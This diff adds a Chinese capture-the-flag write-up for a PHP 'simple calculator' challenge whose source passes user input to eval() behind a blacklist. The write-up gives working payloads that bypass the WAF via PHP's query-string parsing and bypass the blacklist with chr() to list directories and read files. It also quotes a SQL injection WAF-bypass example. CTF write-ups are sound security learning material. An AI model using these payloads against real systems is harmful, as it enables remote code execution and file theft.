@@ -944,6 +944,108 @@ curl -d "what=flag" 靶机地址
 
 ------
 
+### [简单的计算器](https://ce.pwnthebox.com/challenges?id=1483)
+
+靶机提供了一个简单的计算器，经过测试，数字和算式都能被计算，但是字母和一些特殊字符不能被解析。查看网页源码，发现关键代码`calc.php?num="+encodeURIComponent($("#content").val())`。
+
+```html
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>简单的计算器</title>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="./libs/bootstrap.min.css">
+  <script src="./libs/jquery-3.3.1.min.js"></script>
+  <script src="./libs/bootstrap.min.js"></script>
+</head>
+<body>
+
+<div class="container text-center" style="margin-top:30px;">
+  <h2>表达式</h2>
+  <form id="calc">
+    <div class="form-group">
+      <input type="text" class="form-control" id="content" placeholder="输入计算式" data-com.agilebits.onepassword.user-edited="yes">
+    </div>
+    <div id="result"><div class="alert alert-success">
+            </div></div>
+    <button type="submit" class="btn btn-primary">计算</button>
+  </form>
+</div>
+<!--I've set up WAF to ensure security.-->
+<script>
+    $('#calc').submit(function(){
+        $.ajax({
+            url:"calc.php?num="+encodeURIComponent($("#content").val()),
+            type:'GET',
+            success:function(data){
+                $("#result").html(`<div class="alert alert-success">
+            <strong>答案:</strong>${data}
+            </div>`);
+            },
+            error:function(){
+                alert("这啥?算不来!");
+            }
+        })
+        return false;
+    })
+</script>
+
+</body></html>
+```
+
+`calc.php?num="+encodeURIComponent($("#content").val())`中的`encodeURIComponent()`函数：
+
+- 不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ’ ( ) 。
+- 其他字符（比如 ：;/?&=+$,# 这些用于分隔 URI 组件的标点符号），都是由一个或多个十六进制的转义序列替换的。
+
+查看`calc.php`，源码如下：
+
+```php+HTML
+<?php
+error_reporting(0);
+if(!isset($_GET['num'])){
+    show_source(__FILE__);
+}else{
+        $str = $_GET['num'];
+        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
+        foreach ($blacklist as $blackitem) {
+                if (preg_match('/' . $blackitem . '/m', $str)) {
+                        die("what are you want to do?");
+                }
+        }
+        eval('echo '.$str.';');
+}
+?>
+```
+
+PHP解析字符串的特性如下：
+
+> PHP将查询字符串（在URL或正文中）转换为内部GET或的关联数组`_POST`。
+> 例如`/?foo=bar`变成`Array([foo] => “bar”)`。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。
+> 例如`/?%20news[id%00=42`会转换为`Array([news_id] => 42)`。
+> 如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：
+> `/news.php?%20news[id%00=42"+AND+1=0 #`
+> 上述PHP语句的参数`%20news[id%00`的值将存储到`$_GET[“news_id”]`中。
+> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
+> 1.删除空白符
+> 2.将某些字符转换为下划线（包括空格）
+
+使用`scandir()`函数返回指定目录中的文件和目录的数组。扫描靶机根目录是`scandir("/")`，但是`/`被过滤了。访问`/calc.php?%20num=scandir("/")`看到`what are you want to do?`。用`scandir(chr(47))`绕过，访问`/calc.php?%20num=scandir(chr(47))`得到`Array`。使用 `var_dump()` 枚举查看数组中的内容，访问`/calc.php?%20num=var_dump(scandir(chr(47)))`看到以下信息，发现`f1agg`！
+
+```
+array(24) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(5) "f1agg" [8]=> string(4) "home" [9]=> string(3) "lib" [10]=> string(5) "lib64" [11]=> string(5) "media" [12]=> string(3) "mnt" [13]=> string(3) "opt" [14]=> string(4) "proc" [15]=> string(4) "root" [16]=> string(3) "run" [17]=> string(4) "sbin" [18]=> string(3) "srv" [19]=> string(8) "start.sh" [20]=> string(3) "sys" [21]=> string(3) "tmp" [22]=> string(3) "usr" [23]=> string(3) "var" }
+```
+
+使用`file_get_contents()`函数将整个文件的内容读入到一个字符串中，`/f1agg`的`ASCII`值为`47, 102, 49, 97, 103, 103`，使用`chr()`得到相应的`ASCII`字符，并用`.`将字符拼接成字符串，`payload`就构造出来啦。
+
+```
+/calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
+```
+
+得到`PTB{f7c125a9-7e87-438b-be4d-e3a3368b3269}`，提交即可。
+
+------
+
 ## CTFSHOW
 
 ### [七夕杯web签到](https://www.ctf.show/challenges#web%E7%AD%BE%E5%88%B0-3767)
